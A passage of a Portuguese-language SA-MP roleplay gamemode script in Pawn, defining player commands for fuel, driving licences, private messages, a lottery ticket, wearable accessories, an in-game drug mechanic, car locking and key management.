	new car = GetPlayerVehicleID(car);

	if(bInfo[gasid][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Negócio sem produtos.");
	
	new string[128];
	
	format(string, sizeof(string), "{FFFFFF}Introduz quantos litros queres atestar. Preço: {00FF00}%d$ {FFFFFF}por litro", oInfo[0][PrecoAtestarG]);
	
	ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", string, "Escolher", "Sair");

	return 1;
}

COMMAND:licencas(playerid, params[], help)
{
    if(!IsPlayerInRangeOfPoint(playerid, 1.0, oInfo[0][LicX], oInfo[0][LicY], oInfo[0][LicZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na escola de condução");

	new string[128], sdialog[512];

	format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Código da Estrada {FF0000}[500$]"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Carta de Condução de Ligeiros {FF0000}[1500$]"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Carta de Condução de Pesados {FF0000}[2500$]"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}Carta de Condução de Motociclos {FF0000}[1000$]"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}Carta de Condução de Barco {FF0000}[5000$]"); strcat(sdialog,string);

	ShowPlayerDialog(playerid, DIALOG_LICENCAS, DIALOG_STYLE_LIST, "{FFFF00}Licenças", sdialog, "Selecionar", "Sair");
    
	return 1;
}

COMMAND:pm(playerid, params[], help)
{
	new giveplayerid, mensagem[128], string[256];

    if(sscanf(params, "ds[128]", giveplayerid, mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/pm <playerid> <mensagem>");
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	
	if(pInfo[playerid][Admin] == 0)
	{
	    if(pInfo[giveplayerid][Admin] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não é Administrador");
	    if(PMStatus[giveplayerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse Administrador tem as PM's desligadas");
	    
	    format(string, sizeof(string), "{73C1EB}[PM'S:] {50A34D}PM Enviada {73C1EB}para %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(giveplayerid), giveplayerid, mensagem);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	    
 	    format(string, sizeof(string), "{73C1EB}[PM'S:] {D9AD7C}PM Recebida {73C1EB}de %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(playerid), playerid, mensagem);
	    SendClientMessage(giveplayerid, COLOR_WHITE, string);
	    
	    sStats[0][PMs]++;
	}
	else
	{
	    format(string, sizeof(string), "{73C1EB}[PM'S:] {73C1EB}PM Enviada {B56BB4}para %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(giveplayerid), giveplayerid, mensagem);
	    SendClientMessage(playerid, COLOR_WHITE, string);

 	    format(string, sizeof(string), "{73C1EB}[PM'S:] {73C1EB}PM Recebida {B56BB4}de %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(playerid), playerid, mensagem);
	    SendClientMessage(giveplayerid, COLOR_WHITE, string);
	    
	    sStats[0][PMs]++;
	}

	return 1;
}

COMMAND:euromilhoes(playerid, params[], help)
{
	new bID = GetPlayerVirtualWorld(playerid);

	if(bInfo[bID][Type] != BTYPE_APOSTAS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
	if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
	if(pInfo[playerid][BilheteEuro] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens um bilhete do Euro Milhões.");
	if(!IsPlayerInRangeOfPoint(playerid, 4, bInfo[bID][ActorX], bInfo[bID][ActorY], bInfo[bID][ActorZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de estar perto da caixa");
	
	new n1, n2, n3, n4, n5, e1, e2;
	new string[128];

	if(sscanf(params, "ddddddd", n1, n2, n3, n4, n5, e1, e2)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/euromilhoes <n1> <n2> <n3> <n4> <n5> <estrela 1> <estrela 2>");
	if(n1 < 1 || n1 > 50 || n2 < 1 || n2 > 50 || n3 < 1 || n3 > 50 || n4 < 1 || n4 > 50 || n5 < 1 || n5 > 50 || e1 < 1 || e1 > 10 || e2 < 1 || e2 > 10) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Números de 1-50 e estrelas entre 1-10");
	if(n1 == n2 || n1 == n3 || n1 == n4 || n1 == n5 ||
	   n2 == n1 || n2 == n3 || n2 == n4 || n2 == n5 ||
	   n3 == n1 || n3 == n2 || n3 == n4 || n3 == n5 ||
	   n4 == n1 || n4 == n2 || n4 == n3 || n4 == n5 ||
	   n5 == n1 || n5 == n2 || n5 == n3 || n5 == n4 || e1 == e2
 	) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes repetir números");

	pInfo[playerid][Euro1] = n1;
	pInfo[playerid][Euro2] = n2;
	pInfo[playerid][Euro3] = n3;
	pInfo[playerid][Euro4] = n4;
	pInfo[playerid][Euro5] = n5;
	pInfo[playerid][Estrela1] = e1;
	pInfo[playerid][Estrela2] = e2;
	pInfo[playerid][BilheteEuro] = 1;
	
	GivePlayerMoneyEx(playerid, -100);
	
	bInfo[bID][Produtos]--;
	
	GuardarJogador(playerid);
	
	format(string, sizeof(string), "Compraste um bilhete do Euro Milhões. Números: %d-%d-%d-%d-%d | Estrelas: %d-%d", n1, n2, n3, n4, n5, e1, e2);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:removeracessorio(playerid, params[], help)
{
	new acessorio[32];
	if(sscanf(params, "s[32]", acessorio))
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/removeracessorio <acessório>");
	    SendClientMessage(playerid, COLOR_CHAT, "[Acessórios]: {FFFFFF}mala - mochila - chapeu - oculos");
	    return 1;
	}
	
	if(strcmp(acessorio, "mala", true) == 0)
	{
	    if(AUsarMala[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a mala");

	    RemovePlayerAttachedObject(playerid, 2);
	    AUsarMala[playerid] = false;
	}
	else if(strcmp(acessorio, "mochila", true) == 0)
 	{
	    if(AUsarMochila[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a mochila");

	    RemovePlayerAttachedObject(playerid, 2);
	    AUsarMochila[playerid] = false;
	}
	else if(strcmp(acessorio, "chapeu", true) == 0)
	{
	    if(AUsarChapeu[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a chapeu");

	    RemovePlayerAttachedObject(playerid, 3);
	    AUsarChapeu[playerid] = false;
	}
	else if(strcmp(acessorio, "oculos", true) == 0)
	{
	    if(AUsarOculos[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a óculos");

	    RemovePlayerAttachedObject(playerid, 4);
	    AUsarOculos[playerid] = false;
	}
	
	return 1;
}

COMMAND:usaracessorio(playerid, params[], help)
{
	new acessorio[32];
	if(sscanf(params, "s[32]", acessorio))
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/usaracessorio <acessório>");
	    SendClientMessage(playerid, COLOR_CHAT, "[Acessórios]: {FFFFFF}mala - mochila");
	    SendClientMessage(playerid, COLOR_CHAT, "[Acessórios]: {FFFFFF}chapeumarinheiro - chapeucowboy - chapeuverde - chapeupreto - chapeusoldado - chapeunormal - chapeunormal2 - chapeuazul");
	    SendClientMessage(playerid, COLOR_CHAT, "[Acessórios]: {FFFFFF}chapeupreto - oculos1 - oculos2 - oculos3 - oculos4 - oculos5 - oculos6 - oculos7 - oculos8 - oculos9");
	    SendClientMessage(playerid, COLOR_CHAT, "[Acessórios]: {FFFFFF}oculos10 - oculos11 - oculos12 - oculos13 - oculos14 - oculos15");
	    return 1;
	}
	new skin = GetPlayerSkin(playerid);
	
	if(strcmp(acessorio, "mala", true) == 0)
	{
	    if(pObjects[playerid][Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
	    if(AUsarMala[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar mala");
	    
	    SetPlayerAttachedObject(playerid,2,1210 ,5 ,0.3 ,0.09 ,-0.02 ,5 ,-90 ,40);
	    AUsarMala[playerid] = true;
	}
	else if(strcmp(acessorio, "mochila", true) == 0)
	{
	    if(pObjects[playerid][Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
	    if(AUsarMochila[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar mochila");
	    
	    SetPlayerAttachedObject(playerid,2,3026 ,1 ,-0.1 ,0 ,0 ,0 ,0 ,0); //
	    AUsarMochila[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeumarinheiro", true) == 0)
	{
		if(pObjects[playerid][o_2054] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");
		
		SetPlayerAttachedObject(playerid,3,2054 ,2 ,0.1 ,0.03 ,-0.01 ,0 ,90 ,180);
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeucowboy", true) == 0)
	{
		if(pObjects[playerid][o_18639] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");

		SetPlayerAttachedObject(playerid,3,18639,2,0.17,0.0,0.0,0,0,0);
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeuverde", true) == 0)
	{
		if(pObjects[playerid][o_18943] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");

		SetPlayerAttachedObject(playerid,3,18943,2,0.17,-0.01,0.0,180,0,15);
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeupreto", true) == 0)
	{
		if(pObjects[playerid][o_18943] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");

		SetPlayerAttachedObject(playerid,3,18943,2,0.17,-0.01,0.0,180,0,15);
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeusoldado", true) == 0)
	{
		if(pObjects[playerid][o_2053] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");

		SetPlayerAttachedObject(playerid,3,2053 ,2 ,0.1 ,0.03 ,-0.01 ,0 ,90 ,180);
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeunormal", true) == 0)
	{
		if(pObjects[playerid][o_2052] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");

		SetPlayerAttachedObject(playerid,3,2052 ,2 ,0.1 ,0.03 ,-0.01 ,0 ,90 ,180); // chapeu normal
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeunormal2", true) == 0)
	{
		if(pObjects[playerid][o_19160] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");

		SetPlayerAttachedObject(playerid,3,19160 ,2 ,0.1,0.0,0.0,180,0,15); // chapeu normal
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeuazul", true) == 0)
	{
		if(pObjects[playerid][o_18940] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");

		SetPlayerAttachedObject(playerid,3,18940,2,0.17,-0.01,0.0,180,0,15); // chapeu azul
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "chapeupreto", true) == 0)
	{
		if(pObjects[playerid][o_18941] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");

		SetPlayerAttachedObject(playerid,3,18941,2,0.17,-0.01,0.0,180,0,15); // chapeu azul
		AUsarChapeu[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos1", true) == 0)
	{
		if(pObjects[playerid][o_19011] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19011,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos2", true) == 0)
	{
		if(pObjects[playerid][o_19006] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19006,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos3", true) == 0)
	{
		if(pObjects[playerid][o_19027] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19027,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos4", true) == 0)
	{
		if(pObjects[playerid][o_19007] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19007,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos5", true) == 0)
	{
		if(pObjects[playerid][o_19008] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19008,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos6", true) == 0)
	{
		if(pObjects[playerid][o_19009] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19009,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos7", true) == 0)
	{
		if(pObjects[playerid][o_19010] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19010,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos8", true) == 0)
	{
		if(pObjects[playerid][o_19011] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19011,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos9", true) == 0)
	{
		if(pObjects[playerid][o_19012] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19012,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos10", true) == 0)
	{
		if(pObjects[playerid][o_19013] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19013,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos11", true) == 0)
	{
		if(pObjects[playerid][o_19014] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19014,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos12", true) == 0)
	{
		if(pObjects[playerid][o_19015] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19015,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos13", true) == 0)
	{
		if(pObjects[playerid][o_19016] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19016,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos14", true) == 0)
	{
		if(pObjects[playerid][o_19017] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19017,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	else if(strcmp(acessorio, "oculos15", true) == 0)
	{
		if(pObjects[playerid][o_19018] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
		if(AUsarOculos[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar óculos");

		SetPlayerAttachedObject(playerid,4,19018,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
		AUsarOculos[playerid] = true;
	}
	
	return 1;
}

COMMAND:tiraroculos(playerid, params[], help)
{
	RemovePlayerAttachedObject(playerid, 4);
	AUsarOculos[playerid] = false;

	return 1;
}

COMMAND:tirarchapeu(playerid, params[], help)
{
	RemovePlayerAttachedObject(playerid, 3);
	AUsarChapeu[playerid] = false;

	return 1;
}

COMMAND:consumirdrogas(playerid, params[], help)
{
	if(pInfo[playerid][Drogas] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens drogas");
	
	pInfo[playerid][Drogas]--;
	
	SendClientMessage(playerid, COLOR_INFO, "Consumiste droga");

    TimerDroga[playerid] = SetTimerEx("DrugEffect", 100, true, "i", playerid);
    
   	new rand = random(6);

	if(rand == 1) // viciou
	{
    	SendClientMessage(playerid, COLOR_INFO, "Ficaste viciado na droga. Agora tens de a consumir regularmente, caso contrário perderás vida.");
    	pInfo[playerid][Viciado] = 1;
	}
    
	return 1;
}

COMMAND:trancar(playerid, params[], help)
{
	if(!IsPlayerInAnyVehicle(playerid))
	{
	    new car = FindClosestVehicle(playerid);
	    new found = 0;
	    
		if(pInfo[playerid][ChaveCarro1] == car || pInfo[playerid][ChaveCarro2] == car || pInfo[playerid][ChaveCarro3] == car || pInfo[playerid][ChaveCarro4] == car || pInfo[playerid][ChaveCarroEmp1] == car || pInfo[playerid][ChaveCarroEmp2] == car || pInfo[playerid][ChaveCarroEmp3] == car || pInfo[playerid][ChaveCarroEmp4] == car)
		{
		    found = 1;
		}
		else if(pInfo[playerid][Faction] != 0 && pInfo[playerid][Faction] == cInfo[car][Faction])
		{
		    found = 1;
		}
		
		if(found == 1)
		{
			if(cInfo[car][Trancado] == 0)
			{
		        PlayerActionMessage(playerid, 15.0, "tira o comando do bolso, clica no botão e tranca o carro.");
		        cInfo[car][Trancado] = 1;
			}
			else
			{
			    PlayerActionMessage(playerid, 15.0, "tira o comando do bolso, clica no botão e destranca o carro.");
			    cInfo[car][Trancado] = 0;
			}
		}
	}
	else
	{
	    new car = GetPlayerVehicleID(playerid);

		if(cInfo[car][Trancado] == 0)
		{
	        PlayerActionMessage(playerid, 15.0, "tranca o carro.");
	        cInfo[car][Trancado] = 1;
		}
		else
		{
		    PlayerActionMessage(playerid, 15.0, "destranca o carro.");
		    cInfo[car][Trancado] = 0;
		}
}
	
	return 1;
}

COMMAND:ajudacarro(playerid, params[], help)
{
	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA CARRO]: {FFFFFF}/trancar - /motor - /neon - /bagageira - /capo - /luzes - /deitarchavefora");
	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA CARRO]: {FFFFFF}/porarmacarro - /tirararmacarro - /verarmascarro - /travar");
	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA CARRO]: {FFFFFF}/ligarradio - /estacionar - /cinto - /emprestarchave - /retirarchave");
	
	return 1;
}

COMMAND:deitarchavefora(playerid, params[], help)
{
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new chave;

    if(sscanf(params, "d", chave)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/deitarchavefora <chave>");
    if(chave <= 0 || chave > 8) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave inválida");
	if(pInfo[playerid][ChaveCarro1] == 0 && pInfo[playerid][ChaveCarro2] == 0 && pInfo[playerid][ChaveCarro3] == 0 && pInfo[playerid][ChaveCarro4] == 0 && pInfo[playerid][ChaveCarroEmp1] == 0 && pInfo[playerid][ChaveCarroEmp2] == 0 && pInfo[playerid][ChaveCarroEmp3] == 0 && pInfo[playerid][ChaveCarroEmp4] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma chave!");

	switch(chave)
	{
	    case 1:
	    {
	        if(pInfo[playerid][ChaveCarro1] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");
	        
	        pInfo[playerid][ChaveCarro1] = 0;
	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 1");
	    }
	    case 2:
	    {
	        if(pInfo[playerid][ChaveCarro2] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");

	        pInfo[playerid][ChaveCarro2] = 0;
	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 2");
	    }
	    case 3:
	    {
	        if(pInfo[playerid][ChaveCarro3] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");

	        pInfo[playerid][ChaveCarro3] = 0;
	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 3");
	    }
	    case 4:
	    {
	        if(pInfo[playerid][ChaveCarro4] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");

	        pInfo[playerid][ChaveCarro4] = 0;
	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 4");
	    }
	    case 5:
	    {
	        if(pInfo[playerid][ChaveCarroEmp1] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");

	        pInfo[playerid][ChaveCarroEmp1] = 0;
	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 5");
	    }
	    case 6:
	    {
	        if(pInfo[playerid][ChaveCarroEmp2] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");

	        pInfo[playerid][ChaveCarroEmp2] = 0;
	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 6");
	    }
	    case 7:
	    {
	        if(pInfo[playerid][ChaveCarroEmp3] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");

	        pInfo[playerid][ChaveCarroEmp3] = 0;
	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 7");
	    }
	    case 8:
	    {
	        if(pInfo[playerid][ChaveCarroEmp4] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Chave vazia");

	        pInfo[playerid][ChaveCarroEmp4] = 0;
	        SendClientMessage(playerid, COLOR_ERRO, "Deitaste fora a tua chave nº 8");
	    }
	}

	return 1;
}

COMMAND:retirarchave(playerid, params[], help)
{
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);

	new giveplayerid, car, string[128];

    if(sscanf(params, "dd", giveplayerid, car)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/retirarchave <playerid> <id do carro>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
